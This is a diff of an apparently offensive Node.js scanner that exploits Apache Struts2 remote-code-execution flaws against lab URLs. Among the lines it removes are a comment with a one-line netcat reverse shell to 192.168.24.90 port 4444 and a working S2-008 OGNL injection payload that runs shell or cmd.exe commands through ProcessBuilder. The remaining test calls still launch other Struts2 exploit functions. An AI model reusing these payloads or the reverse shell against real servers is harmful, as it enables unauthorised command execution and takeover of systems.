@@ -514,7 +514,7 @@ function fnCheckTa3(u,dict,szDes,type)
 	{
 		a = String(fs.readFileSync(s)).trim().split(/\n/);
 		// 并发5个线程
-		async.mapLimit(a,5,function(s,fnCbk1)
+		async.mapLimit(a,g_nThread,function(s,fnCbk1)
 		{
 			g_mUrls[a[i]] = true;
 			fnCbk(s,fnCbk1);
@@ -736,39 +736,6 @@ function doStruts2_016(url)
     	// console.log(e || b);
     	if(!e)fnDoBody(e||b,"s2-016",szOldUrl);
     });
-}
-
-/*
-一行反弹shell:
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.24.90 4444 >/tmp/f
-*/
-function doStruts2_007(url, fnCbk)
-{
-	
-}
-
-function doStruts2_008(url, fnCbk)
-{
-	var s = "(#_memberAccess[\"allowStaticMethodAccess\"]=true,#mtx=new java.lang.Boolean(\"false\"),#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#mtx"
-	+ ",#iswin=(@java.lang.System@getProperty(\"os.name\").toLowerCase().contains(\"win\"))"
-	+ ",#cmds=(#iswin?{\"cmd.exe\",\"/c\",\"" + g_szCmdW + "\"}:{\"/bin/bash\",\"-c\",\"" + g_szCmd + "\"})"
-	+ ",#p=new java.lang.ProcessBuilder(#cmds)"
-	+ ",#as=new java.lang.String()"
-	+ ",#p.redirectErrorStream(true),#process=#p.start()"
-	+ ",#b=#process.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000]"
-	+ ",#i=#d.read(#e),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-	+ ",0<#i?(#i=#d.read(#e)):(#i=0),0<#i?(#as=#as+new java.lang.String(#e,0,#i)):(#i)" 
-	+")";
-	request(fnOptHeader({method: 'GET',uri: url + "?debug=command&expression=" + encodeURIComponent(s)
-	    })
-	  , function (error, response, body){
-	  		if(body)
-	  		{
-	  			fnDoBody(body,"s2-008",url);
-	  		}
-	    }
-	  );
 }
 
 // Tomcat 8下导致RCE
@@ -1136,8 +1103,7 @@ if(program.test)
 	//*/
 	//*
 	// doStruts2_001.call({name:null},"http://192.168.10.216:8088/S2-001/login.action");
-	doStruts2_007.call({name:null},"http://192.168.10.216:8088/S2-007/user.action");
-	doStruts2_008.call({name:null},"http://192.168.10.216:8088/S2-008/devmode.action");
+	// doStruts2_007.call({name:null},"http://192.168.10.216:8088/S2-007/user.action");
 	// doStruts2_012.call({name:null},"http://192.168.10.216:8088/S2-012/user.action");
 	doStruts2_013.call({name:null},"http://192.168.10.216:8088/S2-013/link.action");
 	doStruts2_015.call({name:null},"http://192.168.10.216:8088/S2-015/");
